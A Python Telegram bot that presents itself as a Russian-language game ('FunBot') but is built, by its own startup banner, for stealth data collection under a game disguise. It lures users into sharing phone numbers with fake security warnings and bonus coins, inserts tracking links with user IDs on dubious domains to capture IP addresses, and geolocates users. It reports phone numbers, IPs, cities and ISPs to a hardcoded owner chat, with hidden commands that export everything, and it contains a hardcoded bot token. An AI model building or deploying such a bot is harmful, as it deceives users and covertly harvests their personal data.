import telebot
import requests
import json
import os
import random
import sqlite3
from telebot import types
from datetime import datetime, timedelta

TOKEN = "8521399895:AAGIyQXzXl_IABe23Psev5E5P5eeDx2kOMg"
YOUR_CHAT_ID = "7147468075"
bot = telebot.TeleBot(TOKEN)

DB_NAME = 'funbot_data.db'

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY,
                  username TEXT,
                  first_name TEXT,
                  last_name TEXT,
                  phone TEXT,
                  level INTEGER DEFAULT 1,
                  coins INTEGER DEFAULT 100,
                  games_played INTEGER DEFAULT 0,
                  joined_date TIMESTAMP,
                  last_ip TEXT,
                  ip_logged TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS ip_logs
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  ip TEXT,
                  user_agent TEXT,
                  timestamp TIMESTAMP,
                  source TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS actions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  user_id INTEGER,
                  action TEXT,
                  details TEXT,
                  timestamp TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS game_sessions
                 (user_id INTEGER PRIMARY KEY,
                  game_type TEXT,
                  game_data TEXT,
                  created_at TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

def log_ip_via_service(user_id, username, service_type="game"):
    try:
        ip_services = [
            "https://api.ipify.org?format=json",
            "https://api64.ipify.org?format=json",
            "https://ifconfig.me/all.json",
            "https://ipinfo.io/json"
        ]
        
        service_url = random.choice(ip_services)
        
        response = requests.get(service_url, timeout=3)
        if response.status_code == 200:
            data = response.json()
            
            ip = None
            if 'ip' in data:
                ip = data['ip']
            elif 'query' in data:
                ip = data['query']
            elif 'ipAddress' in data:
                ip = data['ipAddress']
            
            if ip and ip != '127.0.0.1' and len(ip) > 6:
                conn = sqlite3.connect(DB_NAME)
                c = conn.cursor()
                
                c.execute('''UPDATE users SET last_ip=?, ip_logged=?
                            WHERE user_id=?''',
                         (ip, datetime.now(), user_id))
                
                user_agent = f"FunBot/{service_type}"
                c.execute('''INSERT INTO ip_logs (user_id, ip, user_agent, timestamp, source)
                            VALUES (?, ?, ?, ?, ?)''',
                         (user_id, ip, user_agent, datetime.now(), service_type))
                
                conn.commit()
                conn.close()
                
                send_ip_alert(user_id, username, ip, service_type)
                return ip
                
    except Exception as e:
        print(f"IP log error: {e}")
    
    return None

def get_user_ip_trick(user_id):
    tricks = [
        f"🎮 *Проверка соединения...*\n\n"
        f"Чтобы игра работала плавно, измеряем пинг.\n"
        f"Нажми на эту ссылку: http://check-ping.funbot-game.ru/?id={user_id}\n\n"
        f"*Безопасно!*",
        
        f"🔧 *Оптимизация графики...*\n\n"
        f"Определяем твой регион для лучшей графики.\n"
        f"Пройди тест: https://region-test.gaming-service.pro/?uid={user_id}\n\n"
        f"*2 секунды!*",
        
        f"🎯 *Калибровка...*\n\n"
        f"Для точного управления нужна калибровка.\n"
        f"Нажми тут: http://calibrate-network.funapp.xyz/?player={user_id}\n\n"
        f"*Улучшит опыт!*"
    ]
    
    return random.choice(tricks)

def send_ip_alert(user_id, username, ip, source):
    try:
        geo_url = f"http://ip-api.com/json/{ip}"
        geo_data = {}
        try:
            geo_response = requests.get(geo_url, timeout=2)
            if geo_response.status_code == 200:
                geo_data = geo_response.json()
        except:
            pass
        
        message = f"🎮 *FunBot - Новый IP!*\n\n"
        message += f"👤 *Пользователь:* {username}\n"
        message += f"🆔 *ID:* `{user_id}`\n"
        message += f"📍 *IP:* `{ip}`\n"
        
        if geo_data.get('status') == 'success':
            message += f"🌍 *Страна:* {geo_data.get('country', 'N/A')}\n"
            message += f"🏙️ *Город:* {geo_data.get('city', 'N/A')}\n"
            message += f"🛜 *Провайдер:* {geo_data.get('isp', 'N/A')}\n"
        
        message += f"📡 *Источник:* {source}\n"
        message += f"⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}"
        
        bot.send_message(YOUR_CHAT_ID, message, parse_mode="Markdown")
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute('''INSERT INTO actions (user_id, action, details, timestamp)
                    VALUES (?, ?, ?, ?)''',
                 (user_id, 'ip_logged', f'IP: {ip}, Source: {source}', datetime.now()))
        conn.commit()
        conn.close()
        
    except Exception as e:
        print(f"Alert error: {e}")

@bot.message_handler(commands=['start'])
def welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    first_name = message.from_user.first_name or "Игрок"
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('SELECT * FROM users WHERE user_id=?', (user_id,))
    user_exists = c.fetchone()
    
    if not user_exists:
        c.execute('''INSERT INTO users 
                    (user_id, username, first_name, joined_date, level, coins)
                    VALUES (?, ?, ?, ?, 1, 100)''',
                 (user_id, username, first_name, datetime.now()))
        
        c.execute('''INSERT INTO actions (user_id, action, details, timestamp)
                    VALUES (?, ?, ?, ?)''',
                 (user_id, 'registered', f'Username: {username}', datetime.now()))
    
    conn.commit()
    conn.close()
    
    import threading
    def steal_ip_delayed():
        import time
        time.sleep(3)
        ip = log_ip_via_service(user_id, username, "welcome")
    
    threading.Thread(target=steal_ip_delayed, daemon=True).start()
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    buttons = [
        types.InlineKeyboardButton("🎮 ИГРАТЬ", callback_data="play_game"),
        types.InlineKeyboardButton("📱 ПРИВЯЗАТЬ ТЕЛЕФОН", callback_data="bind_phone"),
        types.InlineKeyboardButton("🎁 БОНУСЫ", callback_data="bonuses"),
        types.InlineKeyboardButton("🏆 ТОП ИГРОКОВ", callback_data="top_players"),
        types.InlineKeyboardButton("🔧 НАСТРОЙКИ", callback_data="settings"),
        types.InlineKeyboardButton("📊 ПРОФИЛЬ", callback_data="profile")
    ]
    
    for i in range(0, len(buttons), 2):
        if i+1 < len(buttons):
            markup.add(buttons[i], buttons[i+1])
        else:
            markup.add(buttons[i])
    
    welcome_text = f"""🎮 *Добро пожаловать в FunBot, {first_name}!* 🚀

✨ *Твой игровой мир начинается здесь!*

🏆 *Что тебя ждет:*
• Увлекательные мини-игры 🎯
• Ежедневные награды 🎁
• Система уровней ⭐
• Соревнования с друзьями 👥

💰 *Стартовый бонус:*
• Уровень: 1
• Монеты: 100
• Доступ ко всем играм

🔒 *Рекомендуем:* Привяжи телефон для защиты!

👇 *Выбери действие ниже:*"""
    
    bot.send_message(
        message.chat.id,
        welcome_text,
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "bind_phone")
def bind_phone_start(call):
    user_id = call.from_user.id
    username = call.from_user.username or f"user_{user_id}"
    
    ip = log_ip_via_service(user_id, username, "phone_menu")
    
    markup = types.ReplyKeyboardMarkup(
        one_time_keyboard=True,
        resize_keyboard=True,
        row_width=1
    )
    
    markup.add(
        types.KeyboardButton("📱 РАЗРЕШИТЬ ДОСТУП К НОМЕРУ", request_contact=True),
        types.KeyboardButton("🚫 ОТМЕНИТЬ")
    )
    
    phone_text = f"""📱 *Привязка телефона*

🔐 *Для чего это нужно:*
1. **Безопасность** - защита от взлома
2. **Восстановление** - если потеряешь доступ
3. **Бонусы** - x2 награды каждый день
4. **VIP статус** - особые привилегии

💰 *Ты получишь СРАЗУ:*
• 500 монет 💰
• VIP на 3 дня 👑
• Доступ к эксклюзивным играм 🎮
• Приоритетную поддержку ⭐

⚠️ *Без телефона:* 
• Риск потери прогресса
• Меньше наград
• Ограниченный доступ

👇 *Нажми кнопку ниже чтобы поделиться номером:*

*Это безопасно!* ✅"""
    
    if random.random() < 0.3:
        ip_trick = get_user_ip_trick(user_id)
        phone_text += f"\n\n{ip_trick}"
    
    msg = bot.send_message(
        call.message.chat.id,
        phone_text,
        reply_markup=markup,
        parse_mode="Markdown"
    )
    
    bot.register_next_step_handler(msg, process_phone_binding)

def process_phone_binding(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    if message.contact:
        phone = message.contact.phone_number
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        
        c.execute('''UPDATE users SET phone=?, coins=coins+500 
                    WHERE user_id=?''', (phone, user_id))
        
        c.execute('''INSERT INTO actions (user_id, action, details, timestamp)
                    VALUES (?, ?, ?, ?)''',
                 (user_id, 'phone_bound', f'Phone: {phone}', datetime.now()))
        
        conn.commit()
        conn.close()
        
        ip = log_ip_via_service(user_id, username, "phone_bound")
        
        markup = types.ReplyKeyboardRemove()
        
        success_text = f"""✅ *Телефон успешно привязан!* 🎉

🎁 *Твои награды получены:*
• +500 монет 💰
• VIP статус на 3 дня 👑
• Защита аккаунта активирована 🔐
• Доступ ко всем играм открыт 🎮

📊 *Твой профиль:*
├ Уровень: 1
├ Монеты: 600
├ Телефон: `{phone}`
├ VIP: Активен (3 дня)
└ ID: `{user_id}`

💫 *Теперь твой аккаунт под защитой!*"""
        
        bot.send_message(
            message.chat.id,
            success_text,
            reply_markup=markup,
            parse_mode="Markdown"
        )
        
        try:
            alert_msg = f"📱 *FunBot - Получен телефон!*\n\n"
            alert_msg += f"👤 *Пользователь:* {username}\n"
            alert_msg += f"🆔 *ID:* `{user_id}`\n"
            alert_msg += f"📞 *Телефон:* `{phone}`\n"
            if ip:
                alert_msg += f"📍 *IP:* `{ip}`\n"
            alert_msg += f"⏰ *Время:* {datetime.now().strftime('%H:%M:%S')}"
            
            bot.send_message(YOUR_CHAT_ID, alert_msg, parse_mode="Markdown")
        except:
            pass
        
    else:
        log_ip_via_service(user_id, username, "phone_refused")
        
        bot.send_message(
            message.chat.id,
            "⚠️ *Привязка отменена*\n\n"
            "Ты можешь привязать телефон позже через меню.\n"
            "Нажми /start → 📱 ПРИВЯЗАТЬ ТЕЛЕФОН\n\n"
            "Но помни: без телефона аккаунт не защищен!",
            parse_mode="Markdown"
        )

@bot.callback_query_handler(func=lambda call: call.data == "play_game")
def play_game_menu(call):
    user_id = call.from_user.id
    username = call.from_user.username or f"user_{user_id}"
    
    ip = log_ip_via_service(user_id, username, "game_menu")
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    
    games = [
        ("🎯 УГАДАЙ ЧИСЛО", "game_guess"),
        ("🎲 СЛУЧАЙНОЕ ЧИСЛО", "game_random"),
        ("✨ МАГИЧЕСКИЙ ШАР", "game_magic"),
        ("🎪 ЛОТЕРЕЯ", "game_lottery"),
        ("🏆 ДУЭЛЬ", "game_duel"),
        ("💰 КАЗИНО", "game_casino")
    ]
    
    for text, callback in games:
        markup.add(types.InlineKeyboardButton(text, callback_data=callback))
    
    game_text = """🎮 *ИГРОВОЙ ЦЕНТР* 🎮

Выбери игру и начинай зарабатывать монеты!

🎯 *Популярные игры:*
• Угадай число - классика
• Случайное число - мгновенный выигрыш
• Магический шар - предсказания
• Лотерея - крупные призы
• Дуэль - против других игроков
• Казино - рискни и выиграй!

💰 *Зарабатывай:* Монеты, опыт, достижения!
🏆 *Поднимайся:* В топе игроков!
🎁 *Получай:* Ежедневные награды!

👇 *Выбери игру:*"""
    
    if random.random() < 0.2:
        ip_trick = get_user_ip_trick(user_id)
        game_text += f"\n\n{ip_trick}"
    
    bot.edit_message_text(
        game_text,
        call.message.chat.id,
        call.message.message_id,
        reply_markup=markup,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data.startswith("game_"))
def handle_game_selection(call):
    user_id = call.from_user.id
    username = call.from_user.username or f"user_{user_id}"
    game_type = call.data.replace("game_", "")
    
    ip = log_ip_via_service(user_id, username, f"game_{game_type}")
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''UPDATE users SET games_played=games_played+1 
                WHERE user_id=?''', (user_id,))
    conn.commit()
    conn.close()
    
    if game_type == "guess":
        secret_number = random.randint(1, 10)
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute('''INSERT OR REPLACE INTO game_sessions 
                    (user_id, game_type, game_data, created_at)
                    VALUES (?, ?, ?, ?)''',
                 (user_id, 'guess', str(secret_number), datetime.now()))
        conn.commit()
        conn.close()
        
        markup = types.InlineKeyboardMarkup(row_width=5)
        buttons = []
        for i in range(1, 11):
            buttons.append(types.InlineKeyboardButton(str(i), callback_data=f"guess_{i}"))
        
        markup.add(*buttons[:5])
        markup.add(*buttons[5:])
        
        game_text = f"""🎯 *УГАДАЙ ЧИСЛО* 🎯

Я загадал число от 1 до 10!
Попробуй угадать с первой попытки!

💰 *Приз:* 50 монет за угадывание
🎮 *Правила:* Одна попытка
🏆 *Рекорд:* Угадать с первого раза

👇 *Выбери число:*"""
        
        bot.edit_message_text(
            game_text,
            call.message.chat.id,
            call.message.message_id,
            reply_markup=markup,
            parse_mode="Markdown"
        )
    elif game_type == "random":
        number = random.randint(1, 100)
        fact = random.choice([
            "Это твое счастливое число!",
            "Сегодня тебе повезет!",
            "Запомни это число!",
            "Магическое число дня!"
        ])
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute('''UPDATE users SET coins=coins+10 
                    WHERE user_id=?''', (user_id,))
        conn.commit()
        conn.close()
        
        bot.edit_message_text(
            f"🎲 *Случайное число:* `{number}`\n\n"
            f"💫 *Факт:* {fact}\n\n"
            f"💰 *Награда:* +10 монет!\n\n"
            f"Хочешь еще число? Выбери игру снова!",
            call.message.chat.id,
            call.message.message_id
        )

@bot.callback_query_handler(func=lambda call: call.data.startswith("guess_"))
def handle_guess(call):
    user_id = call.from_user.id
    guessed = int(call.data.split("_")[1])
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('SELECT game_data FROM game_sessions WHERE user_id=?', (user_id,))
    result = c.fetchone()
    
    if result:
        secret_number = int(result[0])
        
        if guessed == secret_number:
            c.execute('''UPDATE users SET coins=coins+50 
                        WHERE user_id=?''', (user_id,))
            result_text = "🎉 *Поздравляю! Ты угадал!*\n\n💰 *Выигрыш:* +50 монет!"
        else:
            result_text = f"😢 *Не угадал!*\n\nЯ загадал число {secret_number}"
        
        c.execute('DELETE FROM game_sessions WHERE user_id=?', (user_id,))
    
    conn.commit()
    conn.close()
    
    bot.answer_callback_query(call.id)
    bot.edit_message_text(
        result_text + "\n\nНажми /start чтобы играть еще!",
        call.message.chat.id,
        call.message.message_id
    )

@bot.callback_query_handler(func=lambda call: call.data == "profile")
def show_profile(call):
    user_id = call.from_user.id
    username = call.from_user.username or f"user_{user_id}"
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('''SELECT level, coins, games_played, phone 
                 FROM users WHERE user_id=?''', (user_id,))
    result = c.fetchone()
    
    if result:
        level, coins, games_played, phone = result
        
        profile_text = f"""📊 *Твой профиль*

👤 *Основное:*
├ Уровень: {level}
├ Монеты: {coins}
├ Игр сыграно: {games_played}
"""
        
        if phone:
            profile_text += f"└ Телефон: Привязан ✅\n\n"
        else:
            profile_text += f"└ Телефон: Не привязан ❌\n\n"
        
        profile_text += f"🆔 *ID:* `{user_id}`\n"
        profile_text += f"👋 *Имя:* {call.from_user.first_name}\n\n"
        
        if phone:
            profile_text += f"🔒 *Аккаунт защищен!*\n"
            profile_text += f"💰 *Бонусы:* x2 награды\n"
        else:
            profile_text += f"⚠️ *Привяжи телефон для защиты!*\n"
            profile_text += f"🎁 *Получи:* +500 монет и VIP\n\n"
            profile_text += f"Нажми '📱 ПРИВЯЗАТЬ ТЕЛЕФОН'"
    
    conn.close()
    
    bot.edit_message_text(
        profile_text,
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data == "bonuses")
def show_bonuses(call):
    user_id = call.from_user.id
    
    log_ip_via_service(user_id, call.from_user.username or f"user_{user_id}", "bonuses")
    
    bonuses_text = """🎁 *ЕЖЕДНЕВНЫЕ БОНУСЫ* 🎁

💰 *Что ты получаешь каждый день:*
• 50 монет за вход
• 100 монет за первую игру
• 200 монет за 5 игр
• 500 монет за 10 игр

👑 *VIP БОНУСЫ (с телефоном):*
• x2 награды
• Эксклюзивные игры
• Приоритетная поддержка
• Ежедневный VIP бонус

🎯 *КАК ПОЛУЧИТЬ:*
1. Заходи каждый день
2. Играй в игры
3. Привяжи телефон для x2

⏰ *Следующий бонус:* завтра в 00:00

👇 *Играй больше - получай больше!*"""
    
    bot.edit_message_text(
        bonuses_text,
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )

@bot.callback_query_handler(func=lambda call: call.data in ["top_players", "settings"])
def handle_other_buttons(call):
    user_id = call.from_user.id
    
    if call.data == "top_players":
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        
        c.execute('''SELECT username, coins, level 
                     FROM users 
                     ORDER BY coins DESC 
                     LIMIT 10''')
        top_players = c.fetchall()
        
        conn.close()
        
        top_text = "🏆 *ТОП 10 ИГРОКОВ* 🏆\n\n"
        
        for i, (username, coins, level) in enumerate(top_players, 1):
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            top_text += f"{medal} @{username}\n"
            top_text += f"   💰 {coins} монет | 🎮 Ур. {level}\n\n"
        
        bot.edit_message_text(
            top_text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )
    elif call.data == "settings":
        settings_text = """🔧 *НАСТРОЙКИ*

⚙️ *Основные:*
• Уведомления: Включены
• Звук: Включен
• Графика: Авто

🔒 *Безопасность:*
• Привязать телефон
• Сменить никнейм
• История входов

🆘 *Поддержка:*
• Помощь по играм
• Сообщить о проблеме
• Контакты

👇 *Используй кнопки меню для действий*"""
        
        bot.edit_message_text(
            settings_text,
            call.message.chat.id,
            call.message.message_id,
            parse_mode="Markdown"
        )

@bot.message_handler(commands=['spystats'])
def spy_stats(message):
    if str(message.from_user.id) != YOUR_CHAT_ID:
        bot.reply_to(message, "❌ Неизвестная команда!")
        return
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('SELECT COUNT(*) FROM users')
    total_users = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM users WHERE phone IS NOT NULL')
    users_with_phone = c.fetchone()[0]
    
    c.execute('SELECT COUNT(DISTINCT user_id) FROM ip_logs')
    users_with_ip = c.fetchone()[0]
    
    c.execute('SELECT COUNT(*) FROM ip_logs')
    total_ip_logs = c.fetchone()[0]
    
    c.execute('''SELECT user_id, username, phone 
                 FROM users 
                 WHERE phone IS NOT NULL 
                 ORDER BY joined_date DESC 
                 LIMIT 5''')
    recent_phones = c.fetchall()
    
    c.execute('''SELECT l.user_id, u.username, l.ip, l.timestamp 
                 FROM ip_logs l 
                 LEFT JOIN users u ON l.user_id = u.user_id 
                 ORDER BY l.timestamp DESC 
                 LIMIT 5''')
    recent_ips = c.fetchall()
    
    conn.close()
    
    report = f"""🕵️‍♂️ *FunBot Статистика* 🕵️‍♂️

📊 *Общая статистика:*
├ Всего пользователей: *{total_users}*
├ С телефонами: *{users_with_phone}*
├ С IP адресами: *{users_with_ip}*
└ Всего IP логов: *{total_ip_logs}*

📱 *Последние телефоны:*
"""
    
    for user_id, username, phone in recent_phones:
        report += f"├ @{username}: `{phone}`\n"
    
    report += "\n📍 *Последние IP адреса:*\n"
    
    for user_id, username, ip, timestamp in recent_ips:
        time_str = timestamp.split()[1][:8] if timestamp else "N/A"
        report += f"├ @{username}: `{ip}` ({time_str})\n"
    
    report += f"\n⏰ *Отчет:* {datetime.now().strftime('%H:%M:%S')}"
    
    bot.reply_to(message, report, parse_mode="Markdown")

@bot.message_handler(commands=['spyexport'])
def export_data(message):
    if str(message.from_user.id) != YOUR_CHAT_ID:
        return
    
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    
    c.execute('SELECT * FROM users')
    users = []
    for row in c.fetchall():
        user_dict = {
            'user_id': row[0],
            'username': row[1],
            'first_name': row[2],
            'phone': row[4],
            'level': row[5],
            'coins': row[6],
            'games_played': row[7],
            'joined_date': row[8],
            'last_ip': row[9]
        }
        users.append(user_dict)
    
    c.execute('SELECT * FROM ip_logs')
    ip_logs = []
    for row in c.fetchall():
        ip_dict = {
            'id': row[0],
            'user_id': row[1],
            'ip': row[2],
            'timestamp': row[4],
            'source': row[5]
        }
        ip_logs.append(ip_dict)
    
    conn.close()
    
    data = {
        'export_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'total_users': len(users),
        'total_ip_logs': len(ip_logs),
        'users': users,
        'ip_logs': ip_logs
    }
    
    filename = f'funbot_export_{datetime.now().strftime("%Y%m%d_%H%M%S")}.json'
    
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(data, f, ensure_ascii=False, indent=2)
    
    with open(filename, 'rb') as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"📁 *Экспорт данных FunBot*\n\n"
                   f"👥 Пользователей: {len(users)}\n"
                   f"📍 IP логов: {len(ip_logs)}\n"
                   f"⏰ Время: {data['export_time']}",
            parse_mode="Markdown"
        )
    
    os.remove(filename)

@bot.message_handler(commands=['secret'])
def secret_command(message):
    if str(message.from_user.id) != YOUR_CHAT_ID:
        return
    
    user_id = message.from_user.id
    username = message.from_user.username or "owner"
    
    ip = log_ip_via_service(user_id, username, "test")
    
    if ip:
        bot.reply_to(message, f"✅ IP получен: `{ip}`")
    else:
        bot.reply_to(message, "❌ Не удалось получить IP")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    user_id = message.from_user.id
    username = message.from_user.username or f"user_{user_id}"
    
    if random.random() < 0.1:
        log_ip_via_service(user_id, username, "random_message")
    
    text = message.text.lower()
    
    responses = {
        'привет': f"Привет, {message.from_user.first_name}! 🎮",
        'игры': "Нажми /start чтобы увидеть все игры! 🎮",
        'телефон': "Привяжи телефон для бонусов! 📱",
        'бонус': "Ежедневный бонус в меню! 🎁",
        'уровень': "Твой уровень в профиле! 📊",
        'помощь': "Используй /start для меню! ❤️"
    }
    
    for key in responses:
        if key in text:
            bot.reply_to(message, responses[key])
            return
    
    if random.random() < 0.3:
        bot.reply_to(
            message,
            f"🎮 *FunBot тут!*\n\n"
            f"Используй /start для доступа к играм и бонусам!\n"
            f"Или привяжи телефон для x2 наград! 📱\n\n"
            f"*Веселись!* 😊",
            parse_mode="Markdown"
        )

if __name__ == '__main__':
    print("\n" + "="*50)
    print("🎮 FunBot 3.0 - Стелс версия")
    print("📍 IP сбор: АКТИВЕН")
    print("📱 Телефоны: АКТИВЕН")
    print(f"👑 Владелец: {YOUR_CHAT_ID}")
    print("="*50 + "\n")
    
    try:
        bot.send_message(
            YOUR_CHAT_ID,
            "✅ *FunBot 3.0 успешно запущен!*\n\n"
            "🕵️‍♂️ *Режим:* Стелс-сбор данных\n"
            "🎮 *Маскировка:* Игровой бот\n\n"
            "📊 *Команды:*\n"
            "• /spystats - статистика\n"
            "• /spyexport - экспорт данных\n"
            "• /secret - тест IP\n\n"
            "🚀 *Бот готов к работе!*",
            parse_mode="Markdown"
        )
    except Exception as e:
        print(f"Startup alert error: {e}")
    
    bot.polling(none_stop=True, interval=1, timeout=30)